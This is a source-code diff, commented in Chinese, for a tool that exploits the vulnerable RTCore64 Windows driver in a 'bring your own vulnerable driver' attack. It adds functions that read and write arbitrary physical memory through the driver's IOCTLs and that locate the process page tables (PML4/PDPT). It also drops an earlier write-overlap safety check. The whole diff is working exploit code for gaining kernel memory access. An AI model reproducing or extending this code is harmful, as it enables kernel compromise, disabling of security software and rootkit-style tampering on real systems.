@@ -142,7 +142,120 @@ enum class RTCore64Format {
 // ★ v3.100: 存储 IOCTL 探测结果 — 让 MapPhysical 使用正确的格式
 static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;
 
-// 尝试一种 IOCTL 码 + 格式组合
+// ★ v3.104: 存储探测到的 IOCTL 码 (读/写分开)
+static uint32_t g_probedReadIoctl  = 0;
+static uint32_t g_probedWriteIoctl = 0;
+
+// ★ v3.104: 直接物理内存读取 — 通过 IOCTL 读取物理内存数据
+//   RTCore64 驱动 (0x80002048) 内部使用 MmMapIoSpace 映射物理内存,
+//   然后将数据复制到 output buffer 返回给用户态。
+//   它不会返回映射后的 VA, 而是直接返回数据!
+//   之前的 TryMapPhysical 错误地将返回数据当作 VA 使用 → crash。
+static bool PhysicalReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
+                                  uint64_t physAddr, void* outBuf, size_t size) {
+    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;
+
+    // 页对齐地址和大小
+    uint64_t alignedAddr = physAddr & ~0xFFFULL;
+    uint32_t offsetInPage = (uint32_t)(physAddr - alignedAddr);
+    uint32_t readSize = (uint32_t)((offsetInPage + size + 0xFFF) & ~0xFFF);
+    if (readSize < 0x1000) readSize = 0x1000;
+
+    // 使用 FMT_48B_PA_AT_00: physAddr@+0x00, size@+0x10
+    uint8_t inBuf[48] = {};
+    *(uint64_t*)(inBuf + 0x00) = alignedAddr;
+    *(uint32_t*)(inBuf + 0x10) = readSize;
+
+    std::vector<uint8_t> outBufVec(readSize + 0x100);
+    DWORD bytesRet = 0;
+    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
+                              inBuf, sizeof(inBuf),
+                              outBufVec.data(), (DWORD)outBufVec.size(),
+                              &bytesRet, nullptr);
+    if (!ok) {
+        ByovdDiag("BYOVD:PhysicalRead: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
+                  ioctlCode, (unsigned long long)physAddr, GetLastError());
+        return false;
+    }
+
+    if (bytesRet < offsetInPage + size) {
+        ByovdDiag("BYOVD:PhysicalRead: short read got=%u need=%u (phys=0x%llX)\n",
+                  bytesRet, offsetInPage + (uint32_t)size, (unsigned long long)physAddr);
+        if (bytesRet <= offsetInPage) return false;
+        // copy partial data
+        size_t avail = bytesRet - offsetInPage;
+        memcpy(outBuf, outBufVec.data() + offsetInPage, (avail < size) ? avail : size);
+        return true;
+    }
+
+    memcpy(outBuf, outBufVec.data() + offsetInPage, size);
+    return true;
+}
+
+// ★ v3.104: 直接物理内存写入 — 通过 IOCTL 写入物理内存
+//   使用 0x8000204C (Write PhysMem) 或 0x80002048+8 变体
+static bool PhysicalWriteViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
+                                   uint64_t physAddr, const void* inBuf, size_t size) {
+    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;
+
+    uint64_t alignedAddr = physAddr & ~0xFFFULL;
+    uint32_t offsetInPage = (uint32_t)(physAddr - alignedAddr);
+    uint32_t writeSize = offsetInPage + (uint32_t)size;
+
+    // 先读取整页, 修改目标区域, 再写回
+    // 分配读缓冲区
+    std::vector<uint8_t> pageBuf(0x1000);
+    if (!PhysicalReadViaIOCTL(hDevice, g_probedReadIoctl ? g_probedReadIoctl : ioctlCode,
+                               alignedAddr, pageBuf.data(), 0x1000)) {
+        // 如果读失败, 尝试直接写 (某些驱动支持直接写)
+        ByovdDiag("BYOVD:PhysicalWrite: read-back failed, trying direct write\n");
+        // 构造写请求: 48字节头部 + 数据
+        uint8_t inBuf48[48] = {};
+        *(uint64_t*)(inBuf48 + 0x00) = alignedAddr;
+        *(uint32_t*)(inBuf48 + 0x10) = writeSize;
+
+        std::vector<uint8_t> writeBuf(48 + writeSize);
+        memcpy(writeBuf.data(), inBuf48, 48);
+        memcpy(writeBuf.data() + 48 + offsetInPage, inBuf, size);
+
+        uint8_t outBuf[64] = {};
+        DWORD bytesRet = 0;
+        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
+                                  writeBuf.data(), (DWORD)writeBuf.size(),
+                                  outBuf, sizeof(outBuf), &bytesRet, nullptr);
+        if (!ok) {
+            ByovdDiag("BYOVD:PhysicalWrite: direct write FAILED err=%u\n", GetLastError());
+            return false;
+        }
+        return true;
+    }
+
+    // 修改目标区域
+    memcpy(pageBuf.data() + offsetInPage, inBuf, size);
+
+    // 写回: 48字节头部 + 页面数据
+    uint8_t inBuf48[48] = {};
+    *(uint64_t*)(inBuf48 + 0x00) = alignedAddr;
+    *(uint32_t*)(inBuf48 + 0x10) = 0x1000;
+
+    std::vector<uint8_t> writeBuf(48 + 0x1000);
+    memcpy(writeBuf.data(), inBuf48, 48);
+    memcpy(writeBuf.data() + 48, pageBuf.data(), 0x1000);
+
+    uint8_t outBuf[64] = {};
+    DWORD bytesRet = 0;
+    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
+                              writeBuf.data(), (DWORD)writeBuf.size(),
+                              outBuf, sizeof(outBuf), &bytesRet, nullptr);
+    if (!ok) {
+        ByovdDiag("BYOVD:PhysicalWrite: write-back FAILED err=%u\n", GetLastError());
+        return false;
+    }
+    return true;
+}
+
+// 尝试一种 IOCTL 码 + 格式组合 (用于探测)
+// ★ v3.104: 改为检测数据返回而非 VA 映射 — 验证返回数据是否合理
 static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr,
                            RTCore64Format fmt, uint8_t** outVirtAddr, DWORD* outErr) {
     uint8_t inBuf[64] = {};
@@ -272,6 +385,13 @@ static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
             if (ok && va) {
                 *outTestVA = va;
                 g_probedIoctlFormat = safeFormats[fi];
+                // ★ v3.104: 同时存储探测到的 IOCTL 码
+                g_probedReadIoctl = ioctl;
+                // 尝试确定写 IOCTL (通常是读 IOCTL + 4 或 + 8)
+                // 0x8000204C = 0x80002048 + 4
+                g_probedWriteIoctl = ioctl + 4;
+                ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X\n",
+                          g_probedReadIoctl, g_probedWriteIoctl);
                 return ioctl;
             }
             // err=1 (ERROR_INVALID_FUNCTION) → IOCTL 码不匹配, 跳过此码
@@ -288,41 +408,21 @@ static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
     return 0; // 全部失败
 }
 
-// 轻量物理映射: 仅 IOCTL, 无日志/缓存/overlap 检查
+// 轻量物理读取: 直接 IOCTL, 无日志/缓存/overlap 检查
+// ★ v3.104: 改为使用 PhysicalReadViaIOCTL 直接读取数据
 static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
-                           uint64_t physAddr, uint8_t** outVirtAddr) {
-    // ★ v3.100: 使用探测到的格式
-    uint8_t* va = nullptr;
-    DWORD err = 0;
-    bool ok = TryMapPhysical(hDevice, ioctlCode, physAddr, g_probedIoctlFormat, &va, &err);
-    if (ok && va) {
-        *outVirtAddr = va;
-        return true;
-    }
-    // 回退: 尝试其他格式
-    for (int fmtIdx = 0; fmtIdx <= 4; fmtIdx++) {
-        RTCore64Format fmt = (RTCore64Format)fmtIdx;
-        if (fmt == g_probedIoctlFormat) continue;
-        ok = TryMapPhysical(hDevice, ioctlCode, physAddr, fmt, &va, &err);
-        if (ok && va) {
-            *outVirtAddr = va;
-            return true;
-        }
-        if (err == 1) break;
-    }
-    ByovdDiag("BYOVD:MapPhysicalRaw: DeviceIoControl FAILED (all formats)\n");
-    return false;
+                           uint64_t physAddr, uint8_t* outBuf4K) {
+    if (!outBuf4K) return false;
+    return PhysicalReadViaIOCTL(hDevice, ioctlCode, physAddr, outBuf4K, 0x1000);
 }
 
 // 检查一个物理页是否为当前进程的 PML4 表
 static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
                         uint64_t physAddr, uint64_t* pml4Entries) {
-    // 映射候选 PML4 页
-    uint8_t* mapped = nullptr;
-    if (!MapPhysicalRaw(hDevice, ioctlCode, physAddr, &mapped))
+    // ★ v3.104: 直接读取物理页到 pml4Entries 缓冲区
+    if (!MapPhysicalRaw(hDevice, ioctlCode, physAddr, (uint8_t*)pml4Entries))
         return false;
 
-    memcpy(pml4Entries, mapped, 0x1000);
     uint64_t* entries = pml4Entries;
 
     // 验证: 内核半区 (entry 256-511) 需要大部分 Present
@@ -337,13 +437,12 @@ static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
         if (!(entries[i] & 1)) continue;
         uint64_t pdptPhys = entries[i] & 0x0000FFFFFFFFF000ULL;
 
-        uint8_t* pdptMapped = nullptr;
-        if (!MapPhysicalRaw(hDevice, ioctlCode, pdptPhys, &pdptMapped))
+        uint8_t pdptBuf[0x1000];
+        if (!MapPhysicalRaw(hDevice, ioctlCode, pdptPhys, pdptBuf))
             continue;
 
         // 读取 PDPT, 检查其内核半区是否也有 Present 条目
-        uint64_t pdptEntries[512];
-        memcpy(pdptEntries, pdptMapped, 0x1000);
+        uint64_t* pdptEntries = (uint64_t*)pdptBuf;
 
         int pdptKernel = 0;
         for (int j = 256; j < 512; j++) {
@@ -358,10 +457,10 @@ static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
 static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
     // ★ v3.85: 先验证 IOCTL 是否真的可用 (避免在僵尸驱动上白扫描)
     {
-        uint8_t* testVA = nullptr;
-        bool testOk = MapPhysicalRaw(hDevice, ioctlCode, SAFE_TEST_PHYS, &testVA);
-        ByovdDiag("BYOVD:FindPML4: IOCTL test phys=0x%llX ok=%d va=0x%llX\n",
-                  (unsigned long long)SAFE_TEST_PHYS, (int)testOk, (unsigned long long)(uintptr_t)testVA);
+        uint8_t testBuf[0x1000];
+        bool testOk = MapPhysicalRaw(hDevice, ioctlCode, SAFE_TEST_PHYS, testBuf);
+        ByovdDiag("BYOVD:FindPML4: IOCTL test phys=0x%llX ok=%d\n",
+                  (unsigned long long)SAFE_TEST_PHYS, (int)testOk);
         if (!testOk) {
             ByovdDiag("BYOVD:FindPML4: IOCTL FAILED — driver zombie?\n");
             return 0; // IOCTL 不可用, 无需扫描
@@ -993,51 +1092,19 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
 }
 
 bool KernelMemoryAccessor::ReadPhysical(uint64_t physAddr, void* outBuf, size_t size) {
-    // 小读取: 直接映射并拷贝
-    uint8_t* virtAddr = nullptr;
-    if (!MapPhysical(physAddr, (uint32_t)size, &virtAddr)) {
-        return false;
-    }
-    memcpy(outBuf, virtAddr, size);
-    return true;
+    // ★ v3.104: 使用直接 IOCTL 读取物理内存, 不再依赖虚假的 VA 映射
+    //   驱动通过 DeviceIoControl output buffer 返回数据, 不返回映射 VA
+    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
+    return PhysicalReadViaIOCTL(m_hDevice, m_driverInfo.ioctlCode, physAddr, outBuf, size);
 }
 
 bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, size_t size) {
-    // ★ v3.100: 使用探测到的 IOCTL 格式进行物理内存写入
+    // ★ v3.104: 使用直接 IOCTL 写入物理内存, 不再依赖虚假的 VA 映射
     if (m_hDevice == INVALID_HANDLE_VALUE) return false;
 
-    uint64_t alignedAddr = physAddr & ~0xFFFULL;
-    uint32_t alignedSize = ((physAddr + size - alignedAddr + 0xFFF) & ~0xFFF);
-
-    ByovdDiag("BYOVD:WritePhysical: phys=0x%llX size=%zu fmt=%d ioctl=0x%08X\n",
-        (unsigned long long)alignedAddr, size, (int)g_probedIoctlFormat, m_driverInfo.ioctlCode);
-
-    uint8_t* mappedAddr = nullptr;
-    DWORD devErr = 0;
-    bool ok = TryMapPhysical(m_hDevice, m_driverInfo.ioctlCode, alignedAddr,
-                             g_probedIoctlFormat, &mappedAddr, &devErr);
-
-    // 如果基本格式失败, 尝试 +8 write variant
-    if (!ok || !mappedAddr) {
-        ByovdDiag("BYOVD:WritePhysical: try write variant ioctl=0x%08X\n", m_driverInfo.ioctlCode + 8);
-        ok = TryMapPhysical(m_hDevice, m_driverInfo.ioctlCode + 8, alignedAddr,
-                            g_probedIoctlFormat, &mappedAddr, &devErr);
-    }
-
-    if (!ok || !mappedAddr) {
-        ByovdDiag("BYOVD:WritePhysical: FAILED err=%u\n", devErr);
-        return false;
-    }
-
-    // ★ v3.69: 检测写入映射是否覆盖 DLL 代码区域
-    if (IsOverlappingProtectedRegion((uintptr_t)mappedAddr, alignedSize)) {
-        ByovdDiag("BYOVD:WritePhysical: OVERLAP DETECTED! mappedVA=0x%llX size=%u phys=0x%llX — WRITE BLOCKED\n",
-            (unsigned long long)mappedAddr, alignedSize, (unsigned long long)alignedAddr);
-        return false;
-    }
-
-    memcpy(mappedAddr + (physAddr - alignedAddr), inBuf, size);
-    return true;
+    // 使用写 IOCTL (0x8000204C) 或回退到读 IOCTL+8
+    uint32_t writeIoctl = g_probedWriteIoctl ? g_probedWriteIoctl : m_driverInfo.ioctlCode;
+    return PhysicalWriteViaIOCTL(m_hDevice, writeIoctl, physAddr, inBuf, size);
 }
 
 // ============================================================
